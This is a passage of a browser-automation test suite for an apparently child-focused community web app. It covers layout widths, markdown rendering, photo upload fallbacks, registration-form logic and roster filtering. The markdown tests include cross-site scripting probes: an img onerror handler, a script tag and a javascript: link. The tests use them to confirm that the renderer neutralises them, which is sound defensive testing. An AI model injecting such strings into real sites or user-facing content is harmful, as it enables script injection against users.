     * It was not. The action dock is `flex: none` and about 320px of icon
     * buttons; on a desktop row that leaves plenty for the message field, but
     * at 390px it left TWENTY-FIVE PIXELS — a vertical sliver. Typing still
     * technically worked, which is exactly why every existing test passed over
     * it. Measured as rendered, at the widths members actually hold. */
    for (const w of [320, 390, 414, 620, 1180]) {
      const cp = await browser.newContext({ viewport: { width: w, height: 800 }, hasTouch: w < 800, isMobile: w < 800 });
      const cpg = await cp.newPage();
      await cpg.goto(BASE + '/tests/_boards_fixture.html?board=composer&css=1', { waitUntil: 'networkidle' });
      await cpg.waitForTimeout(200);
      const box = await cpg.evaluate(() => {
        const el = document.getElementById('cm-input-box');
        if (!el) return null;
        const r = el.getBoundingClientRect();
        return { w: Math.round(r.width), h: Math.round(r.height) };
      });
      ok('the message field is usable at ' + w + 'px (' + (box ? box.w + 'x' + box.h : 'missing') + ')',
        !!box && box.w >= Math.min(240, w - 80) && box.h <= 90);
      await cp.close();
    }

    /* The feed is written by children and read by children, so the renderer
       emits React nodes and never HTML. These assert on the rendered DOM, not
       on a string, because "does it inject markup" is only answerable there. */
    const md = await pc.evaluate(() => {
      const out = {};
      const render = (text) => {
        const host = document.createElement('div');
        document.body.appendChild(host);
        ReactDOM.createRoot(host).render(React.createElement(window.NggMarkdown, { text }));
        return host;
      };
      const hosts = {
        head:   render('# Big\n## Medium\n### Small'),
        list:   render('- one\n- two\n\n1. first\n2. second'),
        quote:  render('> quoted line'),
        code:   render('```js\nconst x = 1;\n```'),
        link:   render('see [the site](https://example.org/x) here'),
        inline: render('*bold* and _italic_ and `code` and ~gone~'),
        xss:    render('<img src=x onerror=alert(1)> <script>alert(2)<\/script>'),
        badurl: render('[click](javascript:alert(1))'),
        rule:   render('a\n\n---\n\nb'),
      };
      return new Promise(r => setTimeout(() => {
        out.headTags = Array.from(hosts.head.querySelectorAll('h1,h2,h3,h4,h5,h6')).map(e => e.tagName);
        out.uls = hosts.list.querySelectorAll('ul li').length;
        out.ols = hosts.list.querySelectorAll('ol li').length;
        out.quote = !!hosts.quote.querySelector('blockquote');
        out.code = (hosts.code.querySelector('pre code') || {}).textContent;
        const a = hosts.link.querySelector('a');
        out.linkHref = a && a.getAttribute('href');
        out.linkRel = a && a.getAttribute('rel');
        out.linkText = a && a.textContent;
        out.inline = hosts.inline.innerHTML;
        out.xssImgs = hosts.xss.querySelectorAll('img').length;
        out.xssScripts = hosts.xss.querySelectorAll('script').length;
        out.xssText = hosts.xss.textContent;
        out.badAnchors = hosts.badurl.querySelectorAll('a').length;
        out.hr = hosts.rule.querySelectorAll('hr').length;
        r(out);
      }, 60));
    });
    ok('markdown renders headings, and starts at h4 so a member cannot inject a page-level heading',
      md.headTags.join(',') === 'H4,H5,H6');
    ok('bulleted and numbered lists both render', md.uls === 2 && md.ols === 2);
    ok('a blockquote renders', md.quote === true);
    ok('a fenced code block keeps its contents verbatim', md.code === 'const x = 1;');
    ok('a horizontal rule renders', md.hr === 1);
    ok('a link renders with its label and opens safely',
      md.linkHref === 'https://example.org/x' && md.linkText === 'the site'
      && /noopener/.test(md.linkRel) && /noreferrer/.test(md.linkRel));
    ok('inline emphasis, code and strike all render',
      /<b>bold<\/b>/.test(md.inline) && /<em>italic<\/em>/.test(md.inline)
      && /<code[^>]*>code<\/code>/.test(md.inline) && /<s>gone<\/s>/.test(md.inline));
    /* The whole reason this emits nodes instead of HTML. */
    ok('typed HTML is shown as text, never parsed as markup',
      md.xssImgs === 0 && md.xssScripts === 0 && /onerror=alert\(1\)/.test(md.xssText));
    ok('a javascript: URL is not turned into a link at all', md.badAnchors === 0);



    /* ── The optimiser not arriving must not refuse the photo ──────────────
     * /vendor/image-tools.js is lazy-loaded. When that one request does not
     * arrive — a flaky mobile signal, a proxy, a cold cache on a bad connection
     * — the raw 3–12MB camera file went at the wall, hit the inline body guard,
     * and came back "that photo is too large". For a photo the device could
     * have shrunk itself, without the network, in about a frame.
     *
     * And the rejected loader promise was CACHED, so the first failure made
     * every later attempt on that page fail identically: retaking, picking
     * another file, pressing the button again, all refused with nothing
     * retrying anything. Intermittent, then total. */
    const noTools = await browser.newPage();
    let toolsTries = 0;
    await noTools.route('**/vendor/image-tools.js', r => { toolsTries++; r.abort(); });
    await noTools.goto(BASE + '/tests/_boards_fixture.html?board=capture&mode=ok', { waitUntil: 'networkidle' });
    await noTools.waitForTimeout(200);
    const big = await noTools.evaluate(async () => {
      // The real client, not the fixture stub — inlineImage is what is under test.
      await new Promise((res, rej) => {
        const s = document.createElement('script');
        s.src = '/dist/api-client.js'; s.onload = res; s.onerror = rej;
        document.head.appendChild(s);
      });
      // 3000x4000 of noise: a real photograph's high-frequency detail, which is
      // what makes a phone JPEG megabytes rather than kilobytes.
      const c = document.createElement('canvas'); c.width = 3000; c.height = 4000;
      const g = c.getContext('2d');
      const img = g.createImageData(3000, 4000);
      for (let i = 0; i < img.data.length; i += 4) {
        img.data[i] = (Math.random() * 255) | 0; img.data[i + 1] = (Math.random() * 255) | 0;
        img.data[i + 2] = (Math.random() * 255) | 0; img.data[i + 3] = 255;
      }
      g.putImageData(img, 0, 0);
      const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.95));
      const file = new File([blob], 'photo.jpg', { type: 'image/jpeg' });
      const out = { bytes: blob.size, toolsAbsent: !window.ImageTools };
      try { const r = await window.NGGApi.uploadOrInline(file, 'headshot'); out.ok = true; out.len = (r.url || '').length; }
      catch (e) { out.ok = false; out.code = e.code || e.message; }
      // A second go must be a real second go, not the cached refusal.
      try { const r2 = await window.NGGApi.uploadOrInline(file, 'headshot'); out.retryOk = true; out.retryLen = (r2.url || '').length; }
      catch (e) { out.retryOk = false; out.retryCode = e.code || e.message; }
      // A tall image must not be shrunk under the server's 320px print floor —
      // a shrink meant to get a photo accepted must not create the rejection.
      const t = document.createElement('canvas'); t.width = 400; t.height = 2400;
      t.getContext('2d').fillStyle = '#8d5524'; t.getContext('2d').fillRect(0, 0, 400, 2400);
      const tall = await new Promise(r => t.toBlob(r, 'image/jpeg', 0.9));
      const shrunk = await window.NGGApi.__canvasShrink(new File([tall], 't.jpg', { type: 'image/jpeg' }), 1000, 0.78, 320);
      const bmp = shrunk ? await createImageBitmap(shrunk) : null;
      out.tall = bmp ? { w: bmp.width, h: bmp.height } : null;
      return out;
    });
    ok('a phone photo still goes through when the optimiser cannot be fetched',
      big.toolsAbsent === true && big.bytes > 3000000 && big.ok === true && big.len < 1400000);
    /* Two attempts must mean two fetches. The rejected loader promise was
       cached, so the optimiser was asked for exactly once per page and every
       later photo silently ran without it — including on the cloud path, where
       the fallback is to upload the raw 12MB file. A dropped request has to
       stay a dropped request, not become a decision. */
    ok('…and a second attempt is a real retry, not the cached failure',
      big.retryOk === true && big.retryLen > 0 && toolsTries >= 2);
    ok('…and shrinking never pushes the short side under the print floor',
      big.tall && big.tall.w >= 320 && big.tall.h > big.tall.w);
    await noTools.close();
    await camCtx2.close();

    /* ── The centre "giant model" hero upload ─────────────────────────────
       Two separate reasons this could not upload, so both are pinned. */
    const fu = await browser.newPage();
    const fuErrs = [];
    fu.on('console', m => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) fuErrs.push(m.text()); });
    fu.on('pageerror', e => fuErrs.push(String(e.message)));
    await fu.goto(BASE + '/tests/_boards_fixture.html?board=fieldupload&mode=ok', { waitUntil: 'networkidle' });
    await fu.waitForTimeout(400);
    ok('the hero-image field mounts with no script error', fuErrs.length === 0 && (await fu.evaluate(() => window.__errors)).length === 0);

    // 1. Clicking Upload must reach the file input. Nesting it in a <label>
    //    that also wraps a text input makes the label the click's owner and
    //    hands activation to the text box instead.
    const clicked = await fu.evaluate(async () => {
      const file = document.querySelector('input[type=file]');
      if (!file) return { noInput: true };
      let got = 0;
      file.addEventListener('click', (e) => { got++; e.preventDefault(); });
      const btn = Array.from(document.querySelectorAll('button')).find(b => /upload/i.test(b.textContent));
      if (!btn) return { noButton: true };
      btn.click();
      await new Promise(r => setTimeout(r, 60));
      return { got, focused: (document.activeElement && document.activeElement.type) || '' };
    });
    ok('clicking Upload reaches the file input', clicked.got === 1);
    ok('…and does not hand the click to the URL box instead', clicked.focused !== 'text');
    ok('…and the field is not nested inside a <label> that owns the file input',
      await fu.evaluate(() => !document.querySelector('label input[type=file]')));

    // 2. A deployment with only an unsigned preset — no signed Cloudinary keys —
    //    is a working upload, and the one this field used to refuse outright:
    //    `uploads.enabled` is false there, and the button rendered as nothing.
    const fu3 = await browser.newPage();
    await fu3.goto(BASE + '/tests/_boards_fixture.html?board=fieldupload&mode=ok&uploads=unsigned', { waitUntil: 'networkidle' });
    await fu3.waitForTimeout(400);
    ok('an unsigned-preset deployment still gets an Upload button',
      await fu3.getByRole('button', { name: /↑ Upload/ }).count() === 1);
    await fu3.evaluate(() => {
      const i = document.querySelector('input[type=file]');
      const dt = new DataTransfer();
      dt.items.add(new File([new Uint8Array([1, 2, 3])], 'model.jpg', { type: 'image/jpeg' }));
      i.files = dt.files;
      i.dispatchEvent(new Event('change', { bubbles: true }));
    });
    await fu3.waitForTimeout(400);
    ok('…and it falls through to the unsigned upload rather than failing',
      (await fu3.evaluate(() => window.__uploaded || []))[0] === 'public:model.jpg'
      && /cloudinary/.test(await fu3.evaluate(() => window.__val || '')));
    await fu3.close();

    // 3. With neither configured the button stays, disabled, saying why —
    //    silently rendering nothing is indistinguishable from a broken page.
    const fu2 = await browser.newPage();
    await fu2.goto(BASE + '/tests/_boards_fixture.html?board=fieldupload&mode=ok&uploads=missing', { waitUntil: 'networkidle' });
    await fu2.waitForTimeout(400);
    ok('with uploads unavailable the field says so instead of hiding the button',
      /Upload unavailable/.test(await fu2.evaluate(() => document.body.innerText)));
    ok('…and explains what is missing', /Cloudinary/.test(
      await fu2.evaluate(() => { const b = Array.from(document.querySelectorAll('button')).find(x => /Upload unavailable/.test(x.textContent)); return (b && b.title) || ''; })));
    await fu2.close();
    await fu.close();

    /* ── The centre hero model bleeds off the bottom ──────────────────────
       The artwork used to stop exactly on the seam between the hero and the
       navy band below — a dead-straight horizontal line across the model's
       shoes, which reads as a cut-off photo rather than a composition. It now
       hangs past the seam and the band paints over its last few centimetres,
       so there is no terminal edge to see. Checked at both breakpoints, since
       they use different bleeds and different bands. */
    /* The 'long copy' case is the one that proves the bleed is deliberate. With
       the figure left to stretch, the model sat at the TOP of its cell and any
       overhang was just leftover height from the image being 88vh in an 82vh
       row — incidental, and it disappears the moment the copy column grows
       taller than that. Pinned to the bottom, the bleed is the amount asked
       for regardless of how much copy the centre has. */
    for (const [w, h, tag, q] of [[1440, 900, 'desktop', ''], [390, 844, 'mobile', ''],
                                  [1440, 1280, 'tall', ''], [1180, 760, 'long copy', '&long=1']]) {
      const ce = await browser.newPage({ viewport: { width: w, height: h } });
      const ceErrs = [];
      ce.on('pageerror', e => ceErrs.push(String(e.message)));
      await ce.goto(BASE + '/tests/_boards_fixture.html?board=centre&mode=ok&css=1' + q, { waitUntil: 'networkidle' });
      /* Wait for the stylesheet to APPLY, not merely to arrive.
       *
       * This fixture injects the real CSS with createElement('link'), and
       * 'networkidle' can fire before the styles are in effect — the window
       * widens under load, which is why this suite went flaky only when it
       * had a dozen other pages behind it. Unstyled, .centre-hero-img has no
       * height rule at all, so every coordinate measured below describes a
       * completely different layout. `position: relative` comes from
       * styles.css, so it is a precise signal that the sheet is live. */
      await ce.waitForFunction(() => {
        const i = document.querySelector('.centre-hero-img');
        return !!i && getComputedStyle(i).position === 'relative';
      }, null, { timeout: 15000 });
      await ce.waitForTimeout(300);
      // elementFromPoint works in viewport coordinates, so the seam has to be
      // on screen before we can ask what is painted there.
      await ce.evaluate(() => {
        const b = ['.centre-hero-cta', '.centre-stats'].map(q => document.querySelector(q))
          .find(el => el && getComputedStyle(el).display !== 'none');
        // behavior:'instant' is load-bearing, not tidiness. The site sets
        // `html { scroll-behavior: smooth }`, which makes every scroll here
        // ANIMATED — so the geometry read on the next line is of the position
        // the page has not moved to yet. It happened to settle in time on a
        // light run and not on a heavy one, which is exactly the shape of the
        // flake this assertion kept showing.
        if (b) b.scrollIntoView({ block: 'center', behavior: 'instant' });
      });
      await ce.waitForTimeout(150);
      const geo = await ce.evaluate(async () => {
        const img = document.querySelector('.centre-hero-img');
        if (!img) return null;
        const bands = ['.centre-hero-cta', '.centre-stats']
          .map(q => document.querySelector(q))
          .filter(el => el && getComputedStyle(el).display !== 'none');
        if (!bands.length) return null;
        const band = bands[0];
        /* Put the PROBE POINT on screen, not the band.
         *
         * Centring the band is not enough: the image hangs ~86px below the
         * band's top, so at a short viewport its bottom edge can land past
         * the fold. elementFromPoint is viewport-relative and returns null
         * for a y outside it — which is indistinguishable from "the model is
         * painting on top", and failed this assertion at random on a layout
         * that was perfectly correct.
         *
         * Two things this has to get right, and the first version got neither:
         *
         *  - Scroll to INCLUDE the point, not to centre it. The point can sit
         *    close enough to the document end that the viewport cannot centre
         *    it however far it scrolls, and aiming for the centre then never
         *    converges — which is why the flake came back.
         *  - Only measure once the hero image has actually loaded. It is the
         *    tallest thing on the page; if it decodes after the scroll, every
         *    coordinate read before that is stale. */
        if (img.tagName === 'IMG' && !img.complete) {
          await new Promise(res => {
            const done = () => res();
            img.addEventListener('load', done, { once: true });
            img.addEventListener('error', done, { once: true });
            setTimeout(done, 3000);
          });
        }
        for (let n = 0; n < 6; n++) {
          const y = img.getBoundingClientRect().bottom - 4;
          if (y >= 8 && y <= window.innerHeight - 8) break;
          // Aim for 70% down the viewport: comfortably inside, and reachable
          // even when the point is near the bottom of the document.
          const before = window.scrollY;
          // Instant, for the same reason as above: an animated scroll leaves
          // scrollY unchanged on the very next line, and this loop would read
          // that as "cannot scroll further" and give up where it stood.
          window.scrollBy({ top: Math.round(y - window.innerHeight * 0.7), behavior: 'instant' });
          if (window.scrollY === before) break;   // cannot scroll further
        }
        const i = img.getBoundingClientRect();
        const b = band.getBoundingClientRect();
        // Geometry alone proves nothing: the model can overlap the band and
        // still paint ON TOP of it, which is exactly the visible cut. Ask the
        // browser what is actually painted 4px above the image's bottom edge —
        // it has to be the band, not the model.
        const px = Math.round(i.left + i.width / 2), py = Math.round(i.bottom - 4);
        const inView = py >= 0 && py < window.innerHeight;
        const hit = inView ? document.elementFromPoint(px, py) : null;
        const occluded = !!(hit && hit !== img && (hit === band || band.contains(hit)));
        // Relative to the hero, not the viewport — the page has been scrolled.
        const hero = document.querySelector('.centre-hero');
        const headroom = hero ? Math.round(i.top - hero.getBoundingClientRect().top) : 0;
        return { bleed: Math.round(i.bottom - b.top), covered: i.bottom <= b.bottom,
                 occluded: occluded, inView: inView,
                 hit: hit ? (hit.className || hit.tagName) : 'none', headroom: headroom };
      });
      if (tag === 'desktop') ok('the centre hero mounts with no script error', ceErrs.length === 0);
      ok('the model bleeds past the seam on ' + tag + ' (' + (geo && geo.bleed) + 'px)', geo && geo.bleed > 20);
      ok('…and the band paints over its bottom edge, so there is no visible cut (' + tag + ')',
        geo && geo.covered && geo.occluded);
      // A probe point that never made it on screen is a harness failure, not a
      // layout one — say which, so a red run is not misread as a design bug.
      ok('…probed a point that is actually on screen (' + tag + ')', geo && geo.inView);
      if (geo && geo.inView && !geo.occluded) console.error('        topmost element at the model\'s bottom edge was:', geo.hit);
      ok('…without pushing the head above the hero (' + tag + ', ' + (geo && geo.headroom) + 'px)', geo && geo.headroom > -20);
      await ce.close();
    }

    /* ── Registration form: faculty narrows course, logic shows fields ────
       The form asked for a course out of one flat list spanning every faculty.
       Faculty now comes first and narrows it, and conditional fields appear
       and disappear with the answer. */
    const gr = await browser.newPage();
    const grErrs = [];
    gr.on('pageerror', e => grErrs.push(String(e.message)));
    await gr.goto(BASE + '/tests/_boards_fixture.html?board=gatereg&mode=ok', { waitUntil: 'networkidle' });
    await gr.waitForTimeout(400);
    ok('the registration form mounts with no script error', grErrs.length === 0 && (await gr.evaluate(() => window.__errors)).length === 0);
    if (grErrs.length) console.error('       ', grErrs.slice(0, 3).join(' | '));

    const opts = (label) => gr.evaluate((l) => {
      const lab = Array.from(document.querySelectorAll('label')).find(x => x.textContent.trim().startsWith(l));
      const sel = lab && lab.querySelector('select');
      return sel ? Array.from(sel.options).map(o => o.textContent) : null;
    }, label);
    const shown = () => gr.evaluate(() => Array.from(document.querySelectorAll('label > span:first-child')).map(s => s.textContent.replace(/[ *🔒]+$/, '').trim()));

    /* School type is a dropdown, not a text box, because it is a fact that
       gets counted: typed, "public" arrives as five different spellings and
       the public/private split every funder report opens with has to be
       reconstructed by hand afterwards. */
    const st = await opts('School type');
    ok('School type is a two-option dropdown, not a free-text box',
      st && st.filter(x => /^(Public|Private)$/.test(x.trim())).length === 2);
    ok('…with a blank first option, because it is not required',
      st && !/^(Public|Private)$/.test(st[0].trim()));

    let o = await opts('Course');
    ok('before a faculty is picked, Course says to choose one first', o && /Choose a faculty first/.test(o[0]));
    /* It offers NOTHING until a faculty is chosen. The previous version of this
       assertion required the opposite — the full catalogue, "rather than being
       a dead end" — which is why the cascade kept reading as broken however
       many times the wiring behind it was fixed: the box said "choose a faculty
       first" and then listed every course in the programme anyway. Worse, a
       course picked before a faculty is silently dropped the moment one is
       chosen, because the reconciliation clears any answer outside the new
       parent's list. The volunteer form has always gated its course picker this
       way; the two now behave alike. */
    ok('…and offers no courses at all until one is picked (' + ((o || []).length - 1) + ' offered)',
       o && o.length === 1);
    ok('…with the control disabled, so it cannot be opened onto an empty list',
       await gr.evaluate(() => {
         const lab = Array.from(document.querySelectorAll('label')).find(x => x.textContent.trim().startsWith('Course'));
         const sel = lab && lab.querySelector('select');
         return !!sel && sel.disabled === true;
       }));

    const pick = (label, value) => gr.evaluate(({ l, v }) => {
      const lab = Array.from(document.querySelectorAll('label')).find(x => x.textContent.trim().startsWith(l));
      const sel = lab.querySelector('select');
      sel.value = v;
      sel.dispatchEvent(new Event('change', { bubbles: true }));
    }, { l: label, v: value });

    await pick('Faculty', 'Music');
    await gr.waitForTimeout(150);
    o = await opts('Course');
    ok('choosing Music narrows Course to Music courses (' + (o || []).slice(1).join(', ') + ')',
      o && o.length === 3 && o.indexOf('Piano') !== -1 && o.indexOf('Practical Coding') === -1);

    ok('…and the control is usable again once a faculty is chosen',
       await gr.evaluate(() => {
         const lab = Array.from(document.querySelectorAll('label')).find(x => x.textContent.trim().startsWith('Course'));
         const sel = lab && lab.querySelector('select');
         return !!sel && sel.disabled === false;
       }));

    let vis = await shown();
    ok('…and the Music-only question appears', vis.indexOf('Which instrument?') !== -1);
    ok('…while the Media/Tech question stays hidden', vis.indexOf('Portfolio link') === -1);

    // Choose a Music course, then switch faculty: the stale course must clear,
    // or the desk submits a course the new faculty does not offer.
    await pick('Course', 'Piano');
    await gr.waitForTimeout(120);
    await pick('Faculty', 'Media');
    await gr.waitForTimeout(150);
    /* Assert the DRAFT, not the <select>. A select whose value is not among its
       options reports '' all by itself, so reading the DOM would pass whether
       or not the stale answer was actually cleared — and it is the stored
       answer that gets submitted. The draft is what the form will send. */
    const draft = await gr.evaluate(() => { try { return JSON.parse(localStorage.getItem('ngg.test.draft')) || {}; } catch (e) { return {}; } });
    ok('switching faculty clears a course the new faculty does not offer (draft.course=' + JSON.stringify(draft.course) + ')',
      draft.faculty === 'Media' && !draft.course);
    o = await opts('Course');
    ok('…and Course now offers only Media courses', o && o.length === 2 && o.indexOf('Graphics') !== -1);

    vis = await shown();
    ok('the "is any of" rule shows for Media', vis.indexOf('Portfolio link') !== -1);
    ok('…and the Music-only question is gone again', vis.indexOf('Which instrument?') === -1);
    ok('an "is empty" rule shows while its field is blank', vis.indexOf('Why not?') !== -1);
    await gr.evaluate(() => {
      const lab = Array.from(document.querySelectorAll('label')).find(x => x.textContent.trim().startsWith('School'));
      if (!lab) return;
      const i = lab.querySelector('input');
      const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
      setter.call(i, 'St Mary'); i.dispatchEvent(new Event('input', { bubbles: true }));
    });

    /* The Continue button must actually enable once the form is filled.
     *
     * It gated on `form.fullName`, which the First/Last split left permanently
     * empty — so the button stayed disabled and NOBODY could register. The
     * form rendered perfectly and every field worked; only the one control
     * that submits it was dead, which is the kind of break that reaches a
     * registration desk before it reaches anyone who could fix it. */
    const type = (label, value) => gr.evaluate(([l, v]) => {
      const lab = Array.from(document.querySelectorAll('label')).find(x => x.textContent.trim().startsWith(l));
      const i = lab && lab.querySelector('input');
      if (!i) return false;
      const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
      setter.call(i, v); i.dispatchEvent(new Event('input', { bubbles: true }));
      return true;
    }, [label, value]);
    const continueDisabled = () => gr.evaluate(() => {
      const b = Array.from(document.querySelectorAll('button')).find(x => /Continue/i.test(x.textContent || ''));
      return b ? b.disabled : null;
    });

    ok('Continue is disabled before a name is entered', (await continueDisabled()) === true);
    ok('the form asks for First name', await type('First name', 'Adaeze'));
    ok('…and Last name', await type('Last name', 'Okonkwo'));
    await gr.waitForTimeout(150);
    ok('…and Continue enables once both are filled', (await continueDisabled()) === false);

    await gr.close();

    /* ── Form builder: the logic editor ──────────────────────────────────── */
    const fb = await browser.newPage();
    const fbErrs = [];
    fb.on('pageerror', e => fbErrs.push(String(e.message)));
    await fb.goto(BASE + '/tests/_boards_fixture.html?board=builder&mode=ok', { waitUntil: 'networkidle' });
    await fb.waitForTimeout(500);
    ok('the form builder mounts with no script error', fbErrs.length === 0 && (await fb.evaluate(() => window.__errors)).length === 0);
    if (fbErrs.length) console.error('       ', fbErrs.slice(0, 3).join(' | '));
    ok('every field offers to become conditional',
      await fb.getByRole('button', { name: '+ Add logic' }).count() >= 3);
    // The first field has nothing above it, so it cannot be conditional.
    ok('…except the first, which has nothing above it to depend on',
      /Add a field above this one/.test(await fb.evaluate(() => document.body.innerText)));

    await fb.getByRole('button', { name: '+ Add logic' }).last().click();
    await fb.waitForTimeout(200);
    const cond = await fb.evaluate(() => {
      const sels = Array.from(document.querySelectorAll('.fb-logic.is-on select'));
      return sels.map(s => ({ label: s.getAttribute('aria-label'), value: s.value, opts: Array.from(s.options).map(o => o.value) }));
    });
    ok('the rule only offers fields ABOVE it as the source',
      cond[0] && cond[0].opts.join(',') === 'fullName,faculty,course');
    ok('…and offers the five operators',
      cond[1] && cond[1].opts.join(',') === 'is,isNot,in,answered,empty');

    await fb.selectOption('.fb-logic.is-on select[aria-label="Condition field"]', 'faculty');
    await fb.waitForTimeout(150);
    const valSel = await fb.evaluate(() => {
      const s = document.querySelector('.fb-logic.is-on select[aria-label="Condition value"]');
      return s ? Array.from(s.options).map(o => o.value) : null;
    });
    ok('a choice source offers its own options as the value, not a text box',
      valSel && valSel.indexOf('Music') !== -1);
    await fb.selectOption('.fb-logic.is-on select[aria-label="Condition operator"]', 'answered');
    await fb.waitForTimeout(150);
    ok('"is answered" drops the value input, because it takes no operand',
      await fb.locator('.fb-logic.is-on [aria-label="Condition value"]').count() === 0);

    await fb.selectOption('.fb-logic.is-on select[aria-label="Condition operator"]', 'is');
    await fb.waitForTimeout(120);
    await fb.selectOption('.fb-logic.is-on select[aria-label="Condition value"]', 'Music');
    await fb.waitForTimeout(120);
    await fb.getByRole('button', { name: /Publish/ }).first().click();
    await fb.waitForTimeout(400);
    const published = await fb.evaluate(() => window.__published);
    ok('publishing sends the rule to the server', (function () {
      if (!published) return false;
      const school = published.find(x => x.key === 'school');
      return school && school.showIf && school.showIf.key === 'faculty' && school.showIf.op === 'is' && school.showIf.value === 'Music';
    })());
    ok('…and the faculty→course link survives a round trip through the builder',
      published && (published.find(x => x.key === 'course') || {}).optionsFrom === 'faculty');
    await fb.close();

    /* ── The roster can actually manage a child ───────────────────────────
       The list served the PUBLIC student shape, so the editor opened blank and
       a save wrote those blanks back over the guardian's contact details. */
    const ro = await browser.newPage();
    const roErrs = [];
    ro.on('pageerror', e => roErrs.push(String(e.message)));
    await ro.goto(BASE + '/tests/_boards_fixture.html?board=roster&mode=ok', { waitUntil: 'networkidle' });
    await ro.waitForTimeout(500);
    ok('the roster mounts with no script error', roErrs.length === 0 && (await ro.evaluate(() => window.__errors)).length === 0);
    if (roErrs.length) console.error('       ', roErrs.slice(0, 3).join(' | '));
    let roBody = await ro.evaluate(() => document.body.innerText);
    ok('…and shows the guardian without having to open anything', /Mrs Alpha/.test(roBody) && /08031110001/.test(roBody));
    ok('…and each child\'s consent standing', /Complete/.test(roBody) && /Awaiting parent/.test(roBody) && /Incomplete/.test(roBody));

    const roRows = () => ro.locator('.admin-table tbody tr').count();
    const roSel = async (label, value) => {
      /* Through `step`: a missing picker used to throw past every later block in
         this file, and this section now drives seven of them. */
      if (!await step('the roster offers a "' + label + '" picker',
                      () => ro.selectOption('select[aria-label="' + label + '"]', value))) return false;
      await ro.waitForTimeout(400);        // debounced, then a round trip
      return true;
    };
    ok('all four children are listed', await roRows() === 4);

    /* ── Filters that COMBINE ─────────────────────────────────────────────────
     * The thing that was broken was not a missing picker. Search and school type
     * went to the server while the situation filter ran on the DRAWN PAGE, so
     * combining them narrowed two different populations at two different
     * moments — and the second only ever saw whichever rows came back first.
     *
     * Every facet is server-side now and they AND together. Checked by driving
     * them: each alone selects a set the pair does not.
     */
    if (await roSel('Filter by centre', 'Egbeda')) {
      ok('filtering by centre narrows to that centre', await roRows() === 3);
      /* And it asked the SERVER, with the centre in the request — a filter
         applied to the drawn rows would satisfy a row count while quietly
         filtering only the page. */
      ok('…by asking the server, with the centre in the request',
        (await ro.evaluate(() => window.__rosterCalls)).some(c => /"centre":"Egbeda"/.test(c)));
      /* THE ASSERTION THE REQUEST IS ABOUT. Egbeda is 3, missing-consent is 2,
         and together they are 1 — narrower than either, which is what AND means
         and what neither OR nor page-filtering would produce. */
      if (await roSel('Filter by consent', 'incomplete')) {
        ok('two filters combine to the intersection, narrower than either alone',
          await roRows() === 1);
        const both = await ro.evaluate(() => document.body.innerText);
        ok('…and it is the right child — Egbeda AND missing a consent',
          /Bode Beta/.test(both) && !/Chidi Gamma/.test(both) && !/Amina Alpha/.test(both));
        /* Each picker's counts are computed with the OTHERS applied. Counting
           over the whole cohort is the faceted-search trap: an option reads (2),
           gets picked, and the table comes back empty because the 2 were counted
           against a population the other filters had already excluded. */
        const cOpts = await ro.evaluate(() => Array.from(
          document.querySelectorAll('select[aria-label="Filter by consent"] option')).map(o => o.textContent));
        ok('…and the consent counts describe THIS centre, not the whole cohort',
          cOpts.some(t => /Consent complete \(2\)/.test(t)) && cOpts.some(t => /Missing a required consent \(1\)/.test(t)));
        /* A facet does not narrow its OWN options, or there would be no way back
           to the value you just moved away from. */
        const ctOpts = await ro.evaluate(() => Array.from(
          document.querySelectorAll('select[aria-label="Filter by centre"] option')).map(o => o.textContent));
        ok('…while the centre picker still offers the centre you are not in',
          ctOpts.some(t => /Ijaiye/.test(t)));
        /* Says how many filters are on, and takes them all off at once — with
           three or four pickers set, clearing them one at a time is four round
           trips and somebody will leave one on. */
        const clr = await ro.evaluate(() => {
          const b = Array.from(document.querySelectorAll('button')).find(x => /Clear \d+ filters?/.test(x.textContent || ''));
          return b ? b.textContent.trim() : null;
        });
        ok('…and says how many filters are in force, with one way to drop them all',
          clr !== null && /Clear 2 filters/.test(clr));
        if (await step('the clear-filters button can be pressed',
                       () => ro.getByRole('button', { name: /Clear 2 filters/ }).click())) {
          await ro.waitForTimeout(400);
          ok('…which returns the whole roster', await roRows() === 4);
        }
      }
    }

    /* Three at once, and the one somebody actually asks out loud: "who at
       Egbeda is still active and has no card". */
    if (await roSel('Filter by centre', 'Egbeda') && await roSel('Filter by standing', 'active')
        && await roSel('Filter by ID issued', 'no')) {
      ok('three filters combine — active, at this centre, and no ID issued',
        await roRows() === 2);
      const tri = await ro.evaluate(() => document.body.innerText);
      ok('…excluding the child at the other centre and the one who has a card',
        !/Chidi Gamma/.test(tri) && !/Amina Alpha/.test(tri)
        && /Bode Beta/.test(tri) && /Dele Delta/.test(tri));
      /* A combination nothing matches must come back empty, not fall back to
         everything — an empty table is a true answer and a full one is a lie. */
      if (await roSel('Filter by school type', 'private')) {
        ok('…and a combination nothing matches returns nothing, not everything',
          await roRows() === 0);
      }
      if (await step('clear the filters again',
                     () => ro.getByRole('button', { name: /Clear \d+ filters?/ }).click())) {
        await ro.waitForTimeout(400);
      }
    }

    /* ── School type ──────────────────────────────────────────────────────────
     * The intake has asked public-or-private since it was built and the export
     * has carried it, but there was no way to ASK — "how many of the children
     * we serve are in government schools" is the first line of most funding
     * applications, and answering it meant exporting the roster and pivoting it
     * in a spreadsheet.
     */
    const stOpts = await ro.evaluate(() => Array.from(
      document.querySelectorAll('select[aria-label="Filter by school type"] option')).map(o => o.textContent));
    /* The split is ON the options. A bare dropdown makes an admin select each
       value in turn to learn the very number the field exists to produce. */
    ok('the school-type picker states the split without being used',
       stOpts.some(t => /Public school \(2\)/.test(t)) && stOpts.some(t => /Private school \(1\)/.test(t)));
    /* Not-recorded is an option, not a hidden remainder — a split quoted
       without its denominator is the one that ends up wrong in an application. */
    ok('…and offers "not recorded" as a state you can ask for',
       stOpts.some(t => /No school type recorded \(1\)/i.test(t)));
    // Nothing is recorded as neither in this fixture, so that option is absent
    // rather than present-and-always-empty.
    ok('…while an option that could only ever return nothing is not offered',
       !stOpts.some(t => /something else/i.test(t)));

    if (await roSel('Filter by school type', 'public')) {
      ok('…and asking for public schools asks the SERVER, not the drawn page',
         (await ro.evaluate(() => window.__rosterCalls)).some(c => /"schoolType":"public"/.test(c)));
      ok('…returning the two public-school children, both spellings',
         await roRows() === 2);
      const stText = await ro.evaluate(() => document.body.innerText);
      ok('…including the row stored as "govt" rather than only the tidy one',
         /Amina Alpha/.test(stText) && /Bode Beta/.test(stText) && !/Chidi Gamma/.test(stText));
